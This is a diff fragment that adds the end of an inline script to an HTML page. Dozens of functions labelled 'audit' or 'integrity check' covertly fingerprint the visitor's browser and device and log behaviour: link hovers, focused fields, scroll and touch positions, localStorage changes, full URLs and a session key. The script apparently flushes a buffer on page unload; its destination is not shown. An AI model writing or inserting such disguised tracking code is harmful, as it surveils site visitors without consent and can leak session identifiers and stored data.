+                        _stageEvent('PERM_STATUS', {
+                            name: n, state: s.state
+                        });
+                    }).catch(() => {});
+                });
+            }
+            _permissionMatrix();
+            function _touchCaps() {
+                _stageEvent('TOUCH_CAPS', {
+                    max: navigator.maxTouchPoints,
+                    enabled: 'ontouchstart' in window
+                });
+            }
+            _touchCaps();
+            function _pdfCheck() {
+                _stageEvent('PDF_CAPS', {
+                    enabled: navigator.pdfViewerEnabled || false
+                });
+            }
+            _pdfCheck();
+            function _doNotTrack() {
+                _stageEvent('DNT_STATUS', {
+                    val: navigator.doNotTrack || window.doNotTrack
+                });
+            }
+            _doNotTrack();
+            function _eventLoopAudit() {
+                const start = Date.now();
+                setTimeout(() => {
+                    _stageEvent('LOOP_LAG', {
+                        ms: Date.now() - start - 1000
+                    });
+                }, 1000);
+            }
+            _eventLoopAudit();
+            function _memoryAudit() {
+                if (performance.memory) {
+                    _stageEvent('MEM_LOG', {
+                        used: performance.memory.usedJSHeapSize,
+                        total: performance.memory.totalJSHeapSize
+                    });
+                }
+            }
+            _memoryAudit();
+            function _visibilityAudit() {
+                _stageEvent('VISIBILITY_INIT', {
+                    state: document.visibilityState
+                });
+            }
+            _visibilityAudit();
+            function _interactionAudit() {
+                let active = true;
+                const _setIdle = () => {
+                    if (active) {
+                        active = false; _stageEvent('USER_IDLE', {
+                            ts: Date.now()
+                        });
+                    }
+                };
+                const _setActive = () => {
+                    if (!active) {
+                        active = true; _stageEvent('USER_RETURN', {
+                            ts: Date.now()
+                        });
+                    }
+                };
+                let _t;
+                document.addEventListener('mousemove', () => {
+                    clearTimeout(_t); _setActive(); _t = setTimeout(_setIdle, 60000);
+                });
+            }
+            _interactionAudit();
+            function _linkAudit() {
+                document.querySelectorAll('a').forEach(a => {
+                    a.addEventListener('mouseenter', () => _stageEvent('HOVER_LINK', {
+                        url: a.href
+                    }));
+                });
+            }
+            _linkAudit();
+            function _titleAudit() {
+                let t = document.title;
+                setInterval(() => {
+                    if (document.title !== t) {
+                        _stageEvent('TITLE_CHANGE', {
+                            from: t, to: document.title
+                        });
+                        t = document.title;
+                    }
+                },
+                    5000);
+            }
+            _titleAudit();
+            function _locationAudit() {
+                _stageEvent('LOCATION_DATA',
+                    {
+                        host: location.hostname,
+                        path: location.pathname,
+                        proto: location.protocol
+                    });
+            }
+            _locationAudit();
+            function _hashAudit() {
+                window.addEventListener('hashchange',
+                    () => _stageEvent('HASH_CHANGE', {
+                        val: location.hash
+                    }));
+            }
+            _hashAudit();
+            function _cookieAudit() {
+                _stageEvent('COOKIE_META',
+                    {
+                        count: document.cookie.split(';').length
+                    });
+            }
+            _cookieAudit();
+            function _gamepadAudit() {
+                window.addEventListener("gamepadconnected",
+                    (e) => _stageEvent('GAMEPAD_ACT', {
+                        id: e.gamepad.id
+                    }));
+            }
+            _gamepadAudit();
+            function _speechAudit() {
+                if (window.speechSynthesis) {
+                    _stageEvent('SPEECH_CAPS', {
+                        count: window.speechSynthesis.getVoices().length
+                    });
+                }
+            }
+            _speechAudit();
+            function _selectionAudit() {
+                document.addEventListener('selectionchange', () => {
+                    const s = window.getSelection().toString();
+                    if (s.length > 5) _stageEvent('TEXT_SEL', {
+                        len: s.length
+                    });
+                });
+            }
+            _selectionAudit();
+            function _printAudit() {
+                window.addEventListener('beforeprint',
+                    () => _stageEvent('PRINT_TRIGGER', {
+                        ts: Date.now()
+                    }));
+            }
+            _printAudit();
+            function _mediaQueryAudit() {
+                _stageEvent('QUERY_META',
+                    {
+                        dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
+                        motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+                    });
+            }
+            _mediaQueryAudit();
+            function _javaAudit() {
+                _stageEvent('JAVA_ENABLED',
+                    {
+                        val: navigator.javaEnabled()
+                    });
+            }
+            _javaAudit();
+            function _workerAudit() {
+                _stageEvent('WORKER_SUPPORT',
+                    {
+                        val: typeof Worker !== 'undefined'
+                    });
+            }
+            _workerAudit();
+            function _idbAudit() {
+                _stageEvent('IDB_SUPPORT',
+                    {
+                        val: !!window.indexedDB
+                    });
+            }
+            _idbAudit();
+            function _navigatorAudit() {
+                _stageEvent('NAV_PROPS',
+                    {
+                        v: navigator.vendor,
+                        p: navigator.platform,
+                        o: navigator.onLine
+                    });
+            }
+            _navigatorAudit();
+            function _storageChangeAudit() {
+                window.addEventListener('storage',
+                    (e) => _stageEvent('LOCAL_STORAGE_CHANGE', {
+                        key: e.key, val: e.newValue
+                    }));
+            }
+            _storageChangeAudit();
+            function _unhandledRejection() {
+                window.addEventListener('unhandledrejection',
+                    (e) => _stageEvent('PROMISE_FAIL', {
+                        reason: String(e.reason)
+                    }));
+            }
+            _unhandledRejection();
+            function _resizeAudit() {
+                window.addEventListener('resize',
+                    () => {
+                        _resChanges.push({
+                            w: window.innerWidth, h: window.innerHeight, ts: Date.now()
+                        });
+                        if (_resChanges.length > 3) {
+                            _stageEvent('RESIZE_EVENT', [..._resChanges]); _resChanges = [];
+                        }
+                    });
+            }
+            _resizeAudit();
+            function _cpuConcurrency() {
+                _stageEvent('CPU_CORES',
+                    {
+                        count: navigator.hardwareConcurrency
+                    });
+            }
+            _cpuConcurrency();
+            function _deviceRam() {
+                _stageEvent('DEVICE_RAM',
+                    {
+                        gb: navigator.deviceMemory || 'unknown'
+                    });
+            }
+            _deviceRam();
+            function _touchStartAudit() {
+                document.addEventListener('touchstart',
+                    (e) => {
+                        if (e.touches[0]) {
+                            _touchPts.push({
+                                x: e.touches[0].pageX, y: e.touches[0].pageY, ts: Date.now()
+                            });
+                            if (_touchPts.length > 5) {
+                                _stageEvent('TOUCH_STREAM', [..._touchPts]); _touchPts = [];
+                            }
+                        }
+                    },
+                    {
+                        passive: true
+                    });
+            }
+            _touchStartAudit();
+            function _finalSyncTrigger() {
+                window.addEventListener('unload',
+                    () => {
+                        _stageEvent('SESSION_CLOSE', {
+                            ts: Date.now()
+                        });
+                        _pushBuffer();
+                    });
+            }
+            _finalSyncTrigger();
+            function _integrityCheck() {
+                _stageEvent('NODE_INTEGRITY',
+                    {
+                        sess: SECURE_CONFIG.SESS_KEY,
+                        href: location.href,
+                        ua: navigator.userAgent
+                    });
+            }
+            _integrityCheck();
+            function _videoCapsAudit() {
+                const v = document.createElement('video');
+                _stageEvent('VIDEO_CODECS',
+                    {
+                        mp4: v.canPlayType('video/mp4'),
+                        webm: v.canPlayType('video/webm')
+                    });
+            }
+            _videoCapsAudit();
+            function _audioCapsAudit() {
+                const a = document.createElement('audio');
+                _stageEvent('AUDIO_CODECS',
+                    {
+                        mp3: a.canPlayType('audio/mpeg'),
+                        wav: a.canPlayType('audio/wav')
+                    });
+            }
+            _audioCapsAudit();
+            function _shadowDomAudit() {
+                _stageEvent('SHADOW_DOM',
+                    {
+                        supported: !!Element.prototype.attachShadow
+                    });
+            }
+            _shadowDomAudit();
+            function _keyboardAudit() {
+                if (navigator.keyboard) {
+                    navigator.keyboard.getLayoutMap().then(m => _stageEvent('KBD_MAP', {
+                        size: m.size
+                    }));
+                }
+            }
+            _keyboardAudit();
+            function _oscillatorSync() {
+                _stageEvent('OSC_SYNC', {
+                    ts: Date.now(), delta: performance.now()
+                });
+            }
+            _oscillatorSync();
+            function _domDepthAudit() {
+                _stageEvent('DOM_DEPTH', {
+                    count: document.querySelectorAll('*').length
+                });
+            }
+            _domDepthAudit();
+            function _inputFocusAudit() {
+                document.addEventListener('focusin', (e) => _stageEvent('FOCUS_IN', {
+                    tag: e.target.tagName, id: e.target.id
+                }));
+            }
+            _inputFocusAudit();
+            function _scrollEndAudit() {
+                let t;
+                window.addEventListener('scroll', () => {
+                    clearTimeout(t);
+                    t = setTimeout(() => _stageEvent('SCROLL_STOP', {
+                        y: window.scrollY
+                    }), 500);
+                });
+            }
+            _scrollEndAudit();
+            function _vibrationAudit() {
+                _stageEvent('VIBRATE_SUPPORT', {
+                    val: !!navigator.vibrate
+                });
+            }
+            _vibrationAudit();
+            function _beaconSupport() {
+                _stageEvent('BEACON_SUPPORT', {
+                    val: !!navigator.sendBeacon
+                });
+            }
+            _beaconSupport();
+            function _fetchSupport() {
+                _stageEvent('FETCH_SUPPORT', {
+                    val: !!window.fetch
+                });
+            }
+            _fetchSupport();
+            function _promiseSupport() {
+                _stageEvent('PROMISE_SUPPORT', {
+                    val: !!window.Promise
+                });
+            }
+            _promiseSupport();
+            function _cryptoSupport() {
+                _stageEvent('CRYPTO_SUPPORT', {
+                    val: !!window.crypto
+                });
+            }
+            _cryptoSupport();
+            function _canvasMeasure() {
+                const c = document.createElement('canvas');
+                const x = c.getContext('2d');
+                x.font = "12px Arial";
+                const m = x.measureText("NSB_SYSTEM_PROBE");
+                _stageEvent('TEXT_METRICS', {
+                    w: m.width
+                });
+            }
+            _canvasMeasure();
+            function _navigatorLanguage() {
+                _stageEvent('LANG_DETAIL', {
+                    pref: navigator.language, all: navigator.languages
+                });
+            }
+            _navigatorLanguage();
+            function _networkType() {
+                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (c) _stageEvent('CONN_TYPE', {
+                    val: c.effectiveType
+                });
+            }
+            _networkType();
+            function _perfNavigation() {
+                if (window.performance && performance.navigation) {
+                    _stageEvent('NAV_TYPE_LOG', {
+                        type: performance.navigation.type
+                    });
+                }
+            }
+            _perfNavigation();
+            function _domCompleteAudit() {
+                _stageEvent('DOM_READY_STATE', {
+                    state: document.readyState
+                });
+            }
+            _domCompleteAudit();
+            function _executionSync() {
+                _stageEvent('EXECUTION_CHCK', {
+                    ts: Date.now()
+                });
+            }
+            _executionSync()
+            function _finalNodeCheck() {
+                _stageEvent('NODE_HEALTH', {
+                    status: 'OK', sid: SECURE_CONFIG.SESS_KEY
+                });
+            }
+            _finalNodeCheck();
+        })();
+    </script>
 </body>
 </html>
